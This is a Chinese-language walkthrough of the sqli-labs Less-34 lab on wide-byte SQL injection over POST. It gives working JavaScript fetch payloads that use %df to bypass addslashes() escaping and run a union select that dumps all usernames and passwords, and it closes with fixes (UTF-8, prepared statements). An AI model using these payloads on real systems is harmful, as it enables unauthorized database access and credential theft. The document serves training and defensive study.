## 一、靶场信息
- **漏洞类型**：POST 请求下的宽字节注入（Wide Byte Injection）。
- **防御机制**：后台使用 `addslashes()` 等函数对用户名和密码中的单引号进行了转义。
- **通关思路**：在 POST 请求体中传入 `%df`，与转义生成的反斜杠 `%5c` 结合，吃掉反斜杠，让单引号逃逸，随后使用联合查询爆出数据。

## 二、核心绕过思路（大白话解析）

这关是 Less-32/33 的 POST 版本。我们不能直接在地址栏输入，而是要在表单的 `uname` 参数里搞事情。

**核心原理**：你输入 `%df'`，后台会帮你转义成 `%df\'`，此时在 GBK 编码下，`%df` 和 `\`（`%5c`）结合成了一个汉字，反斜杠被“吃掉”，后面的单引号成功逃逸，打破了原本的语法限制。

## 三、详细操作步骤与 Payload 解析

由于是 POST 请求，无法直接在 URL 中构造，这里我们使用 F12 开发者工具的 `Console`（控制台）发送 `fetch` 请求进行演示。

### 第一步：探测列数与回显点

**Payload (在 Console 中执行)：**
```javascript
fetch("http://127.0.0.1/sqli-labs-master/Less-34/", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: "uname=admin%df%27%20union%20select%201,2%20%23&passwd=123&submit=Submit"
}).then(res => res.text()).then(text => {
    document.open(); document.write(text); document.close();
});
```

**回显现象：**
页面显示 `Your Login name: 1` 和 `Your Password: 2`（或者反过来），确认存在 2 列回显。

**大白话解析：**
*   **`%df%27`**：`%27` 是单引号的 URL 编码。宽字节 `%df` 吃掉反斜杠，单引号成功闭合。
*   **`%20`**：代替空格（URL 编码中空格必须转义）。
*   **`union select 1,2`**：测试列数。如果报错 `different number of columns`，说明列数不对，这里调试出后台查询是 2 列。
*   **`%23`**：`#` 号的 URL 编码，用作注释符把后面的语句干掉。

### 第二步：终极脱库（提取账号密码）

**Payload (在 Console 中执行)：**
```javascript
fetch("http://127.0.0.1/sqli-labs-master/Less-34/", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: "uname=admin%df%27%20union%20select%201,group_concat(username,0x3a,password)%20from%20users%20%23&passwd=123&submit=Submit"
}).then(res => res.text()).then(text => {
    document.open(); document.write(text); document.close();
});
```

**回显现象：**
页面成功爆出所有账号密码，如 `Dumb:Dumb,Angelina...`。

**大白话解析：**
*   **`group_concat(username,0x3a,password)`**：超级打包机，把 `users` 表里所有的用户名和密码用冒号（`0x3a`）拼接成一长串。
*   放在 `select` 的第 2 列，页面就会把这一长串直接回显在 `Your Login name:` 或者 `Your Password:` 的位置。

## 四、核心防御机制（Remediation）
- **统一字符集**：将数据库和 Web 应用的字符集统一设置为 `UTF-8`，从根本上杜绝宽字节注入。
- **预编译语句（PDO/MySQLi）**：使用参数化查询，彻底隔离代码与数据，让注入无处遁形。
